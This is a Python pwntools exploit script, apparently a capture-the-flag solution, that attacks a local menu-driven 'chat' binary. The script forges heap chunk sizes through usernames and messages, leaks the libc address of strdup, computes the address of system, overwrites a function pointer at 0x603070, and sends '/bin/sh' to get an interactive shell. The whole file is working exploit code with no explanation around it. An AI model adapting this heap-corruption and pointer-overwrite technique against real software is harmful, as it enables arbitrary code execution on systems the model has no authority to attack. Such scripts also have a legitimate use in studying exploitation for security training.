#!/usr/bin/env python
import pwn
import re

p = pwn.process(['./chat'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

latosys = -0x44a70

def sign_up(name, sen = 0):
    p.recvuntil("menu >")
    p.sendline("1")
    p.recvuntil("name >")
    if sen == 0:
        p.sendline(name)
    else:
        p.send(name)
    return

def sign_in(name, sen = 0):
    p.recvuntil("menu >")
    p.sendline("2")
    p.recvuntil("name >")
    if sen == 0:
        p.sendline(name)
    else:
        p.send(name)
    return

def show_timeline():
    p.recvuntil("menu >>")
    p.sendline("1")
    r = p.recvuntil("Done.")
    return r

def show_dm():
    p.recvuntil("menu >>")
    p.sendline("2")
    r = p.recvuntil("Done.")
    return r

def show_userlist():
    p.recvuntil("menu >>")
    p.sendline("3")
    r = p.recvuntil("Done.")
    return r

def send_publicmsg(msg, sen = 0):
    p.recvuntil("menu >>")
    p.sendline("4")
    p.recvuntil("message >>")
    if sen == 0:
        p.sendline(msg)
    else:
        p.send(msg)
    return

def send_directmsg(name, msg, sen1 = 0, sen2 = 0):
    p.recvuntil("menu >>")
    p.sendline("5")
    p.recvuntil("name >>")
    if sen1 == 0:
        p.sendline(name)
    else:
        p.send(name)
    p.recvuntil("message >>")
    if sen2 == 0:
        p.sendline(msg)
    else:
        p.send(msg)
    return

def remove_publicmsg(ID):
    p.recvuntil("menu >>")
    p.sendline("6")
    p.recvuntil("id >>")
    p.sendline(str(ID))
    return

def change_username(name, sen = 0):
    p.recvuntil("menu >>")
    p.sendline("7")
    p.recvuntil("name >>")
    if sen == 0:
        p.sendline(name)
    else:
        p.send(name)
    return

def sign_out():
    p.recvuntil("menu >>")
    p.sendline("0")
    r = p.recvline()
    return r

def quit():
    p.recvuntil("menu >")
    p.sendline("0")
    return

sign_up("AAA")
sign_up("BBB")
sign_up("CCC")

sign_in("AAA")

msg = "C"*0x8 + "\x81"+"\x00"
send_publicmsg(msg)

change_username("A"*0x18 + "\xa1" + "\x00"*7)

sign_in("BBB")
change_username("\x02")

sign_in("CCC")

msg = "A"*0x30+pwn.p64(0x603090)

send_publicmsg(msg)

r = show_userlist().split("*")[2][1:]
r = re.search("P.*", r).group(0)
la = pwn.util.packing.unpack(r.ljust(8, "\x00"), 'all', endian = 'little', signed = False)
print "[+] Strdup is at: "+hex(la)
sys = la + latosys
print "[+] System is at: "+hex(sys)

remove_publicmsg(2)

sign_out()
sign_in("A"*0x18+"\xa1")

send_publicmsg("G")
remove_publicmsg(1)
remove_publicmsg(3)

msg2 = "A"*0x70 + pwn.p64(0x603070)
send_publicmsg(msg2)

send_publicmsg(pwn.p64(sys))
send_publicmsg(pwn.p64(sys))

p.recvuntil("menu >>")

p.sendline("/bin/sh\x00")

print "[+] Shell spawned."

p.interactive()
